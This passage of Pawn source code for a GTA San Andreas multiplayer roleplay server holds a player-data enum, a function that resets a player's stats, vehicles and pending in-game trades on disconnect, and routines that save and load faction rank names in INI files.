	pVIPPoints,
	pStaffObserver,
	pMapper,
	pScripters,
	pColor,
	pGangMod,
	pFacMod,
	pBanAppealer,
	pCarLic,
	pFishLic,
	pGunLic,
	pFlyLic,
	pAccent[16],
	// VIP
	pVIP,
	pVIPDay,
	pVIPMonth,
	pVIPHour,
	pVIPTemp,
	// VIP Job
	pVIPJob,
	//VIP Spawn
	//VIP Spawnpoint
	Float:vSpawnX,
	Float:vSpawnY,
	Float:vSpawnZ,
	pVIPBuddy,
	pDeliverTruck,
	pNew,
	pRefPoints,
	pTester,
	pFightStyle,
	pScope,
	pCookie,
	pOldskool,
	// Toys
	pToyModel[10],
	Float:pToyX[10],
	Float:pToyY[10],
	Float:pToyZ[10],
	Float:pToyRX[10],
	Float:pToyRY[10],
	Float:pToyRZ[10],
 	Float:pToySX[10],
    Float:pToySY[10],
    Float:pToySZ[10],
    // Others
    pReward,
    pFish[5],
    pStoned,
    pGate[3],
    pSafeAdmin,
    pWalk,
    pTGun[2],
	pTGunAmmo[2],
	pvTGun[2],
	pvTGunAmmo[2],
	pvVTGun[2],
	pvVTGunAmmo[2],
	pvVVTGun[2],
	pvVVTGunAmmo[2],
	pLTMaterials,
    pMTMaterials,
    pHTMaterials,
    pvLTMaterials,
    pvMTMaterials,
    pvHTMaterials,
    pvvLTMaterials,
    pvvMTMaterials,
    pvvHTMaterials,
    pvvvLTMaterials,
    pvvvMTMaterials,
    pvvvHTMaterials,
	pTWeed,
	pTWSeeds,
	pTCocaine,
	pvTWeed,
	pvTWSeeds,
	pvTCocaine,
	pvVTWeed,
	pvVTWSeeds,
	pvVTCocaine,
	pvVVTWeed,
	pvVVTWSeeds,
	pvVVTCocaine,
    //1st Vehicle
	pVeh,
	vModel,
	Float:vX,
	Float:vY,
	Float:vZ,
	Float:vA,
	vC1,
	vC2,
	vPJ,
	pVehMod[14],
	vLocked,
	//2nd Vehicle
	pVVeh,
	vVModel,
	Float:vVX,
	Float:vVY,
	Float:vVZ,
	Float:vVA,
	vVC1,
	vVC2,
	vVPJ,
	pVVehMod[14],
	vVLocked,
	//3rd Vehicle
	pVVVeh,
	vVVModel,
	Float:vVVX,
	Float:vVVY,
	Float:vVVZ,
	Float:vVVA,
	vVVC1,
	vVVC2,
	vVVPJ,
	pVVVehMod[14],
	vVVLocked,
	//4th Vehicle
	pVVVVeh,
	vVVVModel,
	Float:vVVVX,
	Float:vVVVY,
	Float:vVVVZ,
	Float:vVVVA,
	vVVVC1,
	vVVVC2,
	vVVVPJ,
	pVVVVehMod[14],
	vVVVLocked,
	pUpgradePoints,
	pArmorUpgrade,
	pHealthUpgrade,
	pSpecialWeapon,
	pTag[32],
	pSName[32],
}
new Player[MAX_PLAYERS][pInfo];

// -------------------------------------------------------------- [ End Of Enums ] ---------------------------------------------------------------
stock BadSkins(playerid,skinid)
{
    if(skinid < 1 || skinid >= 300) return true;
	switch(skinid) // Reserved
	{
		case 0,74,99: return true;
	    case 163,164,165,166: return true;
	    case 274 .. 288: return true;
	}
	if(playerid == 999) return true;
	return false;
}
stock GetWeaponModel(weaponid)
{
        switch(weaponid)
        {
            case 1:
                return 331;

                case 2..8:
                    return weaponid+331;

        case 9:
                    return 341;

                case 10..15:
                        return weaponid+311;

                case 16..18:
                    return weaponid+326;

                case 22..29:
                    return weaponid+324;

                case 30,31:
                    return weaponid+325;

                case 32:
                    return 372;

                case 33..45:
                    return weaponid+324;

                case 46:
                    return 371;
        }
        return 0;
}



stock ClearCar(playerid)
{
	if(Player[playerid][vModel])
	{
		DestroyVehicle(Player[playerid][pVeh]);
	}
	if(Player[playerid][vVModel])
	{
		DestroyVehicle(Player[playerid][pVVeh]);
	}
	if(Player[playerid][vVVModel])
	{
		DestroyVehicle(Player[playerid][pVVVeh]);
	}
	if(Player[playerid][vVVVModel])
	{
		DestroyVehicle(Player[playerid][pVVVVeh]);
	}
	return 1;
}
stock ClearChar(playerid)
{
	// Toys
	for(new i=0; i<10; i++)
	{
	    if(IsPlayerAttachedObjectSlotUsed(playerid, i))
	    {
	        RemovePlayerAttachedObject(playerid, i);
	    }
	}
	if(IsValidDynamic3DTextLabel(AltTabText[playerid])) DestroyDynamic3DTextLabel(AltTabText[playerid]);
	if(IsValidDynamic3DTextLabel(AFKText[playerid]))DestroyDynamic3DTextLabel(AFKText[playerid]);
	if(IsValidDynamic3DTextLabel(VIPText[playerid]))DestroyDynamic3DTextLabel(VIPText[playerid]);
	// Timers
	KillTimer(CuffCountDown[playerid]);
	KillTimer(TazeCountDown[playerid]);
	KillTimer(Tut[playerid]);
	KillTimer(HospitalCountDown[playerid]);
	KillTimer(AntiTPTimer[playerid]);
	KillTimer(StonedTimer[playerid]);
	// Name REquest
	if(NameRequester == playerid) NameRequester = -1;
	// Tax Request
	if(TaxRequester == playerid) TaxRequester = -1;
	// Download bar
	DestroyProgressBar(Download[playerid]);
	// Prison Info
	format(Player[playerid][pJailReason], 64, "");
	format(Player[playerid][pJailBy], 32, "");
	format(Player[playerid][pWanted1], 64, "");
	format(Player[playerid][pWanted2], 64, "");
	format(Player[playerid][pWanted3], 64, "");
	format(Player[playerid][pWanted4], 64, "");
	format(Player[playerid][pWanted5], 64, "");
	format(Player[playerid][pWanted6], 64, "");
	// Contract
	format(Player[playerid][pContractBy], 32, "");
	// Warns
	format(Player[playerid][pWarn1], 64, "");
	format(Player[playerid][pWarn2], 64, "");
	format(Player[playerid][pWarn3], 64, "");
	// Spam
	format(OldSpamCommand[playerid], 128, "");
	format(NewSpamCommand[playerid], 128, "");
	format(OldSpamChat[playerid], 128, "");
	format(NewSpamChat[playerid], 128, "");
	// Flag
	format(Player[playerid][pFlag], 64, "");
	// Admin Tag
	format(Player[playerid][pTag], 32, "");
	// S Name
	format(Player[playerid][pSName], 64, "");
	// Accent
	format(Player[playerid][pAccent], 16, "");
	// VIP Name
	format(VIPName[playerid], MAX_PLAYER_NAME, "");
	// Enum
    Player[playerid][pLevel] = 1; Player[playerid][pMinutes] = 0; Player[playerid][pExp] = 0; Player[playerid][pHours] = 0; Player[playerid][pLoggedIn] = 0; Player[playerid][pSpawn] = 0; Player[playerid][pGender] = 0; Player[playerid][pAge] = 0; Player[playerid][pMoney] = 0; Player[playerid][pModel] = 0;
	Player[playerid][pAdmin] = 0; Player[playerid][pBanned] = 0; Player[playerid][pAdminLocked] = 0; Player[playerid][pX]  = 0; Player[playerid][pY] = 0; Player[playerid][pZ] = 0; Player[playerid][pInt] = 0; Player[playerid][pVIP] = 0; Player[playerid][pVIPDay] = 0; Player[playerid][pVIPMonth] = 0; Player[playerid][pVIPHour] = 0;
	Player[playerid][pVW] = 0; Player[playerid][pFac] = 0; Player[playerid][pFacRank] = 0; Player[playerid][pFacLeader] = 0; Player[playerid][pHospital] = 0; Player[playerid][pFacDuty] = 0; Player[playerid][pFightStyle] = 0; Player[playerid][pFacMod] = 0; Player[playerid][pBanAppealer] = 0;
	Player[playerid][pFacDiv] = 0; Player[playerid][pFacDivLeader] = 0; Player[playerid][pBiz] = 0; Player[playerid][pVBiz] = 0; Player[playerid][pJob] = 0; Player[playerid][pVIPJob] = 0; Player[playerid][pTPackages] = 0; Player[playerid][pHasCellphone] = 0; Player[playerid][pBoombox] = 0; Player[playerid][pAUXCord] = 0; Player[playerid][pCDPlayer] = 0; Player[playerid][pCookie] = 0;
	Player[playerid][pPhone] = 0; Player[playerid][pPhonebook] = 0; Player[playerid][pDice] = 0; Player[playerid][pCigar] = 0; Player[playerid][pSpeedo] = 0; Player[playerid][pSprunk] = 0; Player[playerid][pVIPTemp] = 0; Player[playerid][pScope] = 0; Player[playerid][pOldskool] = 0;
	Player[playerid][pSpray] = 0; Player[playerid][pRope] = 0; Player[playerid][pBlindfold] = 0; Player[playerid][pWT] = 0; Player[playerid][pWTC] = 0; Player[playerid][pGas] = 0; Player[playerid][pRadio] = 0; Player[playerid][pRefPoints] = 0; Player[playerid][pReward] = 0;
	Player[playerid][pInternet] = 0; Player[playerid][pBank] = 0; Player[playerid][pJail] = 0; Player[playerid][pJailTime] = 0; Player[playerid][pWanted] = 0; Player[playerid][pLMPackages] = 0; Player[playerid][pMMPackages] = 0; Player[playerid][pVIPBuddy] = 0; Player[playerid][pTester] = 0; Player[playerid][pColor] = 0;
	Player[playerid][pMaterials] = 0; Player[playerid][pOwner] = 0; Player[playerid][pCrimes] = 0; Player[playerid][pArrested] = 0; Player[playerid][pHouse] = 0; Player[playerid][pVHouse] = 0; Player[playerid][pHelper] = 0; Player[playerid][pDead] = 0; Player[playerid][pRadarGun] = 0; Player[playerid][pFamed] = 0; Player[playerid][pStaffObserver] = 0;
	Player[playerid][pDPackages] = 0; Player[playerid][pHMPackages] = 0; Player[playerid][pWeed] = 0; Player[playerid][pCocaine] = 0; Player[playerid][pContract] = 0; Player[playerid][pGangMod] = 0; Player[playerid][pCarLic] = 0; Player[playerid][pSafeAdmin] = 0; Player[playerid][pFamedPoints] = 0;
	Player[playerid][pTutorial] = 0; Player[playerid][pWarns] = 0; Player[playerid][pNMute] = 0; Player[playerid][pSpawnFreeze] = 0; Player[playerid][pFam] = 0; Player[playerid][pFamRank] = 0; Player[playerid][pCSuccess] = 0; Player[playerid][pCFail] = 0; Player[playerid][pVIPPoints] = 0;
    Player[playerid][pNew] = 0; Player[playerid][pWalk] = 0; Player[playerid][pFishLic] = 0; Player[playerid][pFlyLic] = 0; Player[playerid][pGunLic] = 0; Player[playerid][pxX]  = 0; Player[playerid][pyY] = 0; Player[playerid][pzZ] = 0;
    Player[playerid][pVeh] = 0; Player[playerid][pVVeh] = 0; Player[playerid][pVVVeh] = 0; Player[playerid][pVVVVeh] = 0; Player[playerid][pMapper] = 0; Player[playerid][pFruitProd] = 0; Player[playerid][pGasProd] = 0; Player[playerid][pMatProd] = 0; Player[playerid][pClothProd] = 0;
	Player[playerid][vModel] = 0; Player[playerid][vX] = 0; Player[playerid][vY] = 0; Player[playerid][vZ] = 0; Player[playerid][vA] = 0; Player[playerid][vC1] = 0; Player[playerid][vC2] = 0; Player[playerid][vLocked] = 0;
	Player[playerid][vVModel] = 0; Player[playerid][vVX] = 0; Player[playerid][vVY] = 0; Player[playerid][vVZ] = 0; Player[playerid][vVA] = 0; Player[playerid][vVC1] = 0; Player[playerid][vVC2] = 0; Player[playerid][vVVLocked] = 0;
	Player[playerid][vVVModel] = 0; Player[playerid][vVVX] = 0; Player[playerid][vVVY] = 0; Player[playerid][vVVZ] = 0; Player[playerid][vVVA] = 0; Player[playerid][vVVC1] = 0; Player[playerid][vVVC2] = 0; Player[playerid][vVVVLocked] = 0;
	Player[playerid][vVVVModel] = 0; Player[playerid][vVVVX] = 0; Player[playerid][vVVVY] = 0; Player[playerid][vVVVZ] = 0; Player[playerid][vVVVA] = 0; Player[playerid][vVVVC1] = 0; Player[playerid][vVVVC2] = 0; Player[playerid][vVVVLocked] = 0;
	Player[playerid][pTWeed] = 0; Player[playerid][pTCocaine] = 0; Player[playerid][pTGun][1] = 0; Player[playerid][pTGunAmmo][1] = 0; Player[playerid][pvTWeed] = 0; Player[playerid][pvTCocaine] = 0; Player[playerid][pvTGun][1] = 0; Player[playerid][pvTGunAmmo][1] = 0; Player[playerid][pvTGun][0] = 0; Player[playerid][pvTGunAmmo][0] = 0;
	Player[playerid][pvVTWeed] = 0; Player[playerid][pvVTCocaine] = 0; Player[playerid][pvVTGun][1] = 0; Player[playerid][pvVTGunAmmo][1] = 0; Player[playerid][pvVTGun][0] = 0; Player[playerid][pvVTGunAmmo][0] = 0;
	Player[playerid][pvVVTWeed] = 0; Player[playerid][pvVVTCocaine] = 0; Player[playerid][pvVVTGun][1] = 0; Player[playerid][pvVVTGunAmmo][1] = 0; Player[playerid][pvVVTGun][0] = 0; Player[playerid][pvVVTGunAmmo][0] = 0;
	Player[playerid][pLMaterials] = 0; Player[playerid][pMMaterials] = 0; Player[playerid][pHMaterials] = 0; Player[playerid][pMask] = 0; Player[playerid][pMasked] = 0;
    Player[playerid][pvvLTMaterials] = 0; Player[playerid][pvvMTMaterials] = 0; Player[playerid][pvvHTMaterials] = 0; Player[playerid][pvMTMaterials] = 0; Player[playerid][pvHTMaterials] = 0;
    Player[playerid][pvvvLTMaterials] = 0; Player[playerid][pvvvMTMaterials] = 0; Player[playerid][pvvvHTMaterials] = 0; Player[playerid][pScripters] = 0;
    Player[playerid][pWeedObject] = 0; Player[playerid][pWeedPos][0] = 0; Player[playerid][pWeedPos][1] = 0; Player[playerid][pWeedPos][2] = 0; Player[playerid][pWeedVW] = 0; Player[playerid][pWeedInt] = 0; Player[playerid][pWeedGrowth] = -1; Player[playerid][pSeeds] = 0; Player[playerid][pWeed] = 0;
    Player[playerid][pGarage] = 0; Player[playerid][pVGarage] = 0; Player[playerid][pTWSeeds] = 0; Player[playerid][pvVTWSeeds] = 0; Player[playerid][pvVVTWSeeds] = 0; Player[playerid][pvTWSeeds] = 0;
    Player[playerid][pUpgradePoints] = 0; Player[playerid][pArmorUpgrade] = 0; Player[playerid][pSpecialWeapon] = 0;
    Player[playerid][pGate][0] = 0; Player[playerid][pGate][1] = 0; Player[playerid][pGate][2] = 0;
	for(new i=0; i<5; i++) // Fish
	{
	    Player[playerid][pFish][i] = 0;
	}
    if(Player[playerid][pDeliverTruck] != -1)
    {
	    TruckPackages[Player[playerid][pDeliverTruck]] = -1;
		Player[playerid][pDeliverTruck] = -1;
    }
    for(new i=0; i<14; i++) // Vehicle Mods
	{
		Player[playerid][pVehMod][i] = 0;
		Player[playerid][pVVehMod][i] = 0;
		Player[playerid][pVVVehMod][i] = 0;
		Player[playerid][pVVVVehMod][i] = 0;
	}
    for(new i=0; i<10; i++) // Toys
    {
        Player[playerid][pToyModel][i] = 0;
        Player[playerid][pToyX][i] = 0;
		Player[playerid][pToyY][i] = 0;
		Player[playerid][pToyZ][i] = 0;
		Player[playerid][pToyRX][i] = 0;
		Player[playerid][pToyRY][i] = 0;
		Player[playerid][pToyRZ][i] = 0;
	 	Player[playerid][pToySX][i] = 0;
	    Player[playerid][pToySY][i] = 0;
	    Player[playerid][pToySZ][i] = 0;
    }
	for(new i=0; i<13; i++) // Weapons
	{
	    Player[playerid][pWeapon][i] = 0;
		TempGuns[i] = 0;
		TempGunsAmmo[i] = 0;
	}
	for(new i=0; i<13; i++) // Ammo
	{
	    Player[playerid][pWeaponAmmo][i] = 0;
	}
	for(new i=0; i<MAX_JOBS; i++) // Jobs Skills
	{
	    Player[playerid][pJobSkill][i] = 0;
	}
	for(new i=1; i<MAX_MUSIC; i++) // Downloaded Songs
	{
	    Player[playerid][pSong][i] = 0;
	}
	for(new i=0; i<3; i++) // Admin Mark
	{
	    aMark[playerid][i] = 0;
	}
	// Public Variables
	Invited[playerid] = 0; Inviter[playerid] = 0; Faction[playerid] = 0; Tazer[playerid] = 0; ReplaceTazer[playerid] = 0; Chat[playerid] = -1; JoinMessages[playerid] = 0;
	fPos[0] = 0; fPos[1] = 0; fPos[2] = 0; TazeTimeout[playerid] = 0; TazeCountDown[playerid] = 0; Drag[playerid] = -1; Dragged[playerid] = -1;
	Tracking[playerid] = -1; CuffTimeout[playerid] = 0; CuffCountDown[playerid] = 0; Uncuffed[playerid] = 0; GunsBeingRemoved[playerid] = 0; VIPOff[playerid] = 0; VIPTag[playerid] = 0;
	Tazed[playerid] = 0; Cuffed[playerid] = 0; HospitalCountDown[playerid] = 0; Hospital[playerid] = 0; HospitalTime[playerid] = 0; LastCar[playerid] = 0; Spec[playerid] = 0; Specid[playerid] = -1;
	gPlayerUsingLoopingAnim[playerid] = 0; gPlayerAnimLibsPreloaded[playerid] = 0; NewbieTime[playerid] = 0; Calling[playerid] = 0; Called[playerid] = -1; BeingCalled[playerid] = 0; Caller[playerid] = -1;
	CallTime[playerid] = 0; Speedo[playerid] = 0; fMeter[playerid] = 0; Tied[playerid] = 0; Blindfolded[playerid] = 0; Seconds[playerid] = 0; HasAD[playerid] = 0; OldGun[playerid] = 0; OldAmmo[playerid] = 0;
	FreeBy[playerid] = 0; FreeTime[playerid] = 0; DefendBy[playerid] = 0; FreeTimeout[playerid] = 0; DefendTimeout[playerid] = 0; NoSprunk[playerid] = 0; Hitman[playerid] = -1; gEdit[playerid] = 0; gEditID[playerid] = 0;
    PhoneOff[playerid] = 0; TicketBy[playerid] = -1; CommandSpamCount[playerid] = 0; ChatSpamCount[playerid] = 0; aMarkInt[playerid] = 0; aMarkVw[playerid] = 0; DrugTimeout[playerid] = 0; Event[playerid] = 0; Paintball[playerid] = 0;
	fInvited[playerid] = 0; fInviter[playerid] = 0; Family[playerid] = 0; VestBy[playerid] = -1; hPos[playerid][0] = 0; hPos[playerid][1] = 0; hPos[playerid][2] = 0; hPOS[playerid][0] = 0; hPOS[playerid][1] = 0;
	Whispers[playerid] = 0;  ICchat[playerid] = 0;  Chat[playerid] = -1; SMSes[playerid] = 0; PMs[playerid] = 0; HelpTime[playerid] = 0; ReportTime[playerid] = 0; Approve[playerid] = 0; GMX[playerid] = 0; topened[playerid] = 0;
    pskin[playerid] = 0; fskin[playerid] = 0; Refund[playerid] = 0; AntiTP[playerid] = 0; GettingJob[playerid] = 0; oEdit[playerid] = 0; oEditID[playerid] = 0;
    LiveBy[playerid] = -1; LiveRequest[playerid] = 0; Live[playerid] = 0; Fished[playerid] = 0; FishTime[playerid] = 0; LicenseTest[playerid] = 0; CP[playerid] = 0; FindTimePoints[playerid] = 0; FindingPlayer[playerid] = 0; FindTime[playerid] = 0; UsedFind[playerid] = 0; ConnectedToPC[playerid] = 0;
    vPos[playerid][0] = 1177.5485; vPos[playerid][1] = -1323.5773; vPos[playerid][2] = 14.0761; SpeakerPhone[playerid] = 0; Mobile[playerid] = INVALID_PLAYER_ID; LastSMS[playerid] = 0; CalledMedics[playerid] = 0; aDuty[playerid] = 0;
    ShakeHandRequest[playerid] = 999; ShakeHandStyle[playerid] = 0; sellgunhighmats[playerid] = 0; sellgunmedmats[playerid] = 0; sellgunlowmats[playerid] = 0; GarageTime[playerid] = 0;
	foreach(Player, i)
	{
		if(Logged(i))
		{
		    TicketPrice[playerid][i] = 0;
		    TicketPrice[i][playerid] = 0;
			if(WeedSeller[i] == playerid)
			{
			    WeedSeller[i] = -1; WeedPrice[playerid][i] = 0; WeedAmount[playerid][i] = 0;
			    SendClientMessage(i, COLOR_YELLOW, "The player offering to sell you weed has disconnected from the server.");

			}
			if(cocaineSeller[i] == playerid)
			{
			    cocaineSeller[i] = -1; cocainePrice[playerid][i] = 0; cocaineAmount[playerid][i] = 0;
			    SendClientMessage(i, COLOR_YELLOW, "The player offering to sell you cocaine has disconnected from the server.");
			}
			if(seedSeller[i] == playerid)
			{
			    seedSeller[i] = -1; seedPrice[playerid][i] = 0; seedAmount[playerid][i] = 0;
			    SendClientMessage(i, COLOR_YELLOW, "The player offering to sell you seeds has disconnected from the server.");
			}
		    if(SellMaterialsTo[playerid] == i && BuyMaterialsFrom[i] == playerid)
		    {
		        BuyMaterialsFrom[i] = -1; BuyMaterialsAmount[i] = 0; BuyMaterialsPrice[i] = 0; BeenOfferedMaterials[i] = 0;
		        SendClientMessage(i, COLOR_YELLOW, "The player offering to sell you materials has disconnected from the server.");
		    }
		    if(SellWeaponTo[playerid] == i && BuyWeaponFrom[i] == playerid)
		    {
		        BuyWeaponFrom[i] = -1; BuyWeaponPrice[i] = 0; BeenOfferedWeapon[i] = 0;
		        SendClientMessage(i, COLOR_YELLOW, "The player offering to sell you a weapon has disconnected from the server.");
		    }
		    if(VestBy[playerid] == i)
		    {
		        VestBy[i] = -1;
			    SendClientMessage(i, COLOR_YELLOW, "The player offering to sell you a vest has disconnected from the server.");

		    }
		   	FreePrice[playerid][i] = 0;
			DefendPrice[playerid][i] = 0;
			VestPrice[playerid][i] = 0;
		}
	}
	SellMaterialsTo[playerid] = -1; BuyMaterialsFrom[playerid] = -1; BuyMaterialsAmount[playerid] = 0; BuyMaterialsPrice[playerid] = 0; BeenOfferedMaterials[playerid] = 0;
	SellWeaponTo[playerid] = -1; BuyWeaponFrom[playerid] = -1; BuyWeaponPrice[playerid] = 0; BeenOfferedWeapon[playerid] = 0; WeedSeller[playerid] = -1; cocaineSeller[playerid] = -1; seedSeller[playerid] = -1;
	// Clearing Caller
	if(BeingCalled[playerid] || Calling[playerid])
	{
	    if(BeingCalled[playerid]) SendClientMessage(Caller[playerid], COLOR_ORANGE, " The line went dead...");
    	else if(Calling[playerid]) SendClientMessage(Called[playerid], COLOR_ORANGE, " The line went dead...");
	    new var[1];
	    i_hangup(playerid, var);
	}
	ResetPlayerWeapons(playerid);
	ResetZamoraWeapons(playerid);
	return 1;
}


// Factions Settings
enum facInfo
{
	facLeader[MAX_PLAYER_NAME],
	facMembers,
	fRank1[32],
	fRank2[32],
	fRank3[32],
	fRank4[32],
	fRank5[32],
	fRank6[32],
	fRank7[32],
	fRank8[32],
	fRank9[32],
	fRank10[32],
	fRank11[32],
	fRank12[32],
	fRank13[32],
	fRank14[32],
	fRank15[32],
	fRank16[32],
	fRank17[32],
	fRank18[32],
	fRank19[32],
	fRank20[32],
	fRank21[32],
	fCars[50],
	fDiv1[32],
	fDiv2[32],
	fDiv3[32],
	fDiv4[32],
	fDiv5[32],
	fDiv6[32],
	fDiv7[32],
	fDiv8[32]
}
new FacInfo[MAX_FACTIONS][facInfo];

stock SaveFactions()
{
	// LSPD
	new file[64];
	format(file, sizeof(file), "factions/LSPD.ini");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "LSPDLeader", FacInfo[1][facLeader]);
	dini_Set(file, "Rank1", FacInfo[1][fRank1]);
	dini_Set(file, "Rank2", FacInfo[1][fRank2]);
	dini_Set(file, "Rank3", FacInfo[1][fRank3]);
	dini_Set(file, "Rank4", FacInfo[1][fRank4]);
	dini_Set(file, "Rank5", FacInfo[1][fRank5]);
	dini_Set(file, "Rank6", FacInfo[1][fRank6]);
	dini_Set(file, "Rank7", FacInfo[1][fRank7]);
	dini_Set(file, "Rank8", FacInfo[1][fRank8]);
	dini_Set(file, "Rank9", FacInfo[1][fRank9]);
	dini_Set(file, "Rank10", FacInfo[1][fRank10]);
	dini_Set(file, "Rank11", FacInfo[1][fRank11]);
	dini_Set(file, "Rank12", FacInfo[1][fRank12]);
	dini_Set(file, "Rank13", FacInfo[1][fRank13]);
	dini_Set(file, "Rank14", FacInfo[1][fRank14]);
	dini_Set(file, "Rank15", FacInfo[1][fRank15]);
	dini_Set(file, "Rank16", FacInfo[1][fRank16]);
	dini_Set(file, "Div1", FacInfo[1][fDiv1]);
	dini_Set(file, "Div2", FacInfo[1][fDiv2]);
	dini_Set(file, "Div3", FacInfo[1][fDiv3]);
	dini_Set(file, "Div4", FacInfo[1][fDiv4]);
	dini_Set(file, "Div5", FacInfo[1][fDiv5]);
	print("LSPD files saved successfully.");
	// Government
	format(file, sizeof(file), "factions/GOV.ini");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "GovLeader", FacInfo[2][facLeader]);
	dini_Set(file, "Rank1", FacInfo[2][fRank1]);
	dini_Set(file, "Rank2", FacInfo[2][fRank2]);
	dini_Set(file, "Rank3", FacInfo[2][fRank3]);
	dini_Set(file, "Rank4", FacInfo[2][fRank4]);
	dini_Set(file, "Rank5", FacInfo[2][fRank5]);
	dini_Set(file, "Rank6", FacInfo[2][fRank6]);
	dini_Set(file, "Rank7", FacInfo[2][fRank7]);
    dini_IntSet(file, "TaxPercent", TaxPercent);
	dini_IntSet(file, "TaxVault", TaxMoney);
	print("Government files saved successfully.");
	// Hitman Agency
	format(file, sizeof(file), "factions/HA.ini");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "Rank1", FacInfo[3][fRank1]);
	dini_Set(file, "Rank2", FacInfo[3][fRank2]);
	dini_Set(file, "Rank3", FacInfo[3][fRank3]);
	dini_Set(file, "Rank4", FacInfo[3][fRank4]);
	dini_Set(file, "Rank5", FacInfo[3][fRank5]);
	dini_Set(file, "Rank6", FacInfo[3][fRank6]);
	dini_Set(file, "Rank7", FacInfo[3][fRank7]);
	print("Hitman Agency files saved successfully.");
	// News Agency
	format(file, sizeof(file), "factions/NA.ini");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "NewsLeader", FacInfo[4][facLeader]);
	dini_Set(file, "Rank1", FacInfo[4][fRank1]);
	dini_Set(file, "Rank2", FacInfo[4][fRank2]);
	dini_Set(file, "Rank3", FacInfo[4][fRank3]);
	dini_Set(file, "Rank4", FacInfo[4][fRank4]);
	dini_Set(file, "Rank5", FacInfo[4][fRank5]);
	dini_Set(file, "Rank6", FacInfo[4][fRank6]);
	dini_Set(file, "Rank7", FacInfo[4][fRank7]);
	dini_IntSet(file, "Vault", NewsMoney);
	print("News Agency files saved successfully.");
	// LSFMD
	format(file, sizeof(file), "factions/LSFMD.ini");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "LSFMDLeader", FacInfo[5][facLeader]);
	dini_Set(file, "Rank1", FacInfo[5][fRank1]);
	dini_Set(file, "Rank2", FacInfo[5][fRank2]);
	dini_Set(file, "Rank3", FacInfo[5][fRank3]);
	dini_Set(file, "Rank4", FacInfo[5][fRank4]);
	dini_Set(file, "Rank5", FacInfo[5][fRank5]);
	dini_Set(file, "Rank6", FacInfo[5][fRank6]);
	dini_Set(file, "Rank7", FacInfo[5][fRank7]);
	dini_Set(file, "Rank8", FacInfo[5][fRank8]);
	dini_Set(file, "Rank9", FacInfo[5][fRank9]);
	dini_Set(file, "Rank10", FacInfo[5][fRank10]);
	dini_Set(file, "Rank11", FacInfo[5][fRank11]);
	dini_Set(file, "Rank12", FacInfo[5][fRank12]);
	dini_Set(file, "Rank13", FacInfo[5][fRank13]);
	dini_Set(file, "Rank14", FacInfo[5][fRank14]);
	dini_Set(file, "Rank15", FacInfo[5][fRank15]);
	dini_Set(file, "Rank16", FacInfo[5][fRank16]);
	print("LSFMD files saved successfully.");
    // FBI
	format(file, sizeof(file), "factions/FBI.ini");
	if(!dini_Exists(file)) dini_Create(file);
    dini_Set(file, "FBILeader", FacInfo[6][facLeader]);
	dini_Set(file, "Rank1", FacInfo[6][fRank1]);
	dini_Set(file, "Rank2", FacInfo[6][fRank2]);
	dini_Set(file, "Rank3", FacInfo[6][fRank3]);
	dini_Set(file, "Rank4", FacInfo[6][fRank4]);
	dini_Set(file, "Rank5", FacInfo[6][fRank5]);
	dini_Set(file, "Rank6", FacInfo[6][fRank6]);
	dini_Set(file, "Rank7", FacInfo[6][fRank7]);
	dini_Set(file, "Rank8", FacInfo[6][fRank8]);
	dini_Set(file, "Rank9", FacInfo[6][fRank9]);
	dini_Set(file, "Rank10", FacInfo[6][fRank10]);
	dini_Set(file, "Rank11", FacInfo[6][fRank11]);
	dini_Set(file, "Div1", FacInfo[6][fDiv1]);
	dini_Set(file, "Div2", FacInfo[6][fDiv2]);
	dini_Set(file, "Div3", FacInfo[6][fDiv3]);
	dini_Set(file, "Div4", FacInfo[6][fDiv4]);
	dini_Set(file, "Div5", FacInfo[6][fDiv5]);
	dini_Set(file, "Div6", FacInfo[6][fDiv6]);
	print("FBI files saved successfully.");
	// DOC
	format(file, sizeof(file), "factions/DOC.ini");
	if(!dini_Exists(file)) dini_Create(file);
	dini_Set(file, "NGLeader", FacInfo[7][facLeader]);
	dini_Set(file, "Rank1", FacInfo[7][fRank1]);
	dini_Set(file, "Rank2", FacInfo[7][fRank2]);
	dini_Set(file, "Rank3", FacInfo[7][fRank3]);
	dini_Set(file, "Rank4", FacInfo[7][fRank4]);
	dini_Set(file, "Rank5", FacInfo[7][fRank5]);
	dini_Set(file, "Rank6", FacInfo[7][fRank6]);
	dini_Set(file, "Rank7", FacInfo[7][fRank7]);
	dini_Set(file, "Rank8", FacInfo[7][fRank8]);
	dini_Set(file, "Rank9", FacInfo[7][fRank9]);
	dini_Set(file, "Rank10", FacInfo[7][fRank10]);
	dini_Set(file, "Rank11", FacInfo[7][fRank11]);
	dini_Set(file, "Rank12", FacInfo[7][fRank12]);
	print("DOC files saved successfully.");
	return 1;
}

stock LoadFactions()
{
	// LSPD
    new file[64];
	format(file, sizeof(file), "factions/LSPD.ini");
	format(FacInfo[1][facLeader], MAX_PLAYER_NAME, "%s", dini_Get(file, "LSPDLeader"));
	format(FacInfo[1][fRank1], 32, "Cadet");
	format(FacInfo[1][fRank2], 32, "Specialist Cadet Trainee");
	format(FacInfo[1][fRank3], 32, "Private");
	format(FacInfo[1][fRank4], 32, "Lance Corporal");
	format(FacInfo[1][fRank5], 32, "Corporal");
	format(FacInfo[1][fRank6], 32, "Sergeant");
	format(FacInfo[1][fRank7], 32, "Staff Sergeant");
	format(FacInfo[1][fRank8], 32, "Master Sergeant");
	format(FacInfo[1][fRank9], 32, "Station Inspector");
	format(FacInfo[1][fRank10], 32, "Senior Station Inspector");
	format(FacInfo[1][fRank11], 32, "Inspector");
	format(FacInfo[1][fRank12], 32, "Superintendent");
	format(FacInfo[1][fRank13], 32, "Captain");
	format(FacInfo[1][fRank14], 32, "Commander");
	format(FacInfo[1][fRank15], 32, "Deputy Chief");
	format(FacInfo[1][fRank16], 32, "Chief");
	format(FacInfo[1][fDiv1], 8, "HSU");
	format(FacInfo[1][fDiv2], 8, "ASU");
	format(FacInfo[1][fDiv3], 8, "SIU");
	format(FacInfo[1][fDiv4], 8, "SWAT");
	format(FacInfo[1][fDiv5], 8, "IA");
	print("LSPD files loaded successfully.");
	// Government
	format(file, sizeof(file), "factions/GOV.ini");
	format(FacInfo[2][facLeader], MAX_PLAYER_NAME, "%s", dini_Get(file, "GovLeader"));
	format(FacInfo[2][fRank1], 32, "Government Agent");
	format(FacInfo[2][fRank2], 32, "Department of Transportation");
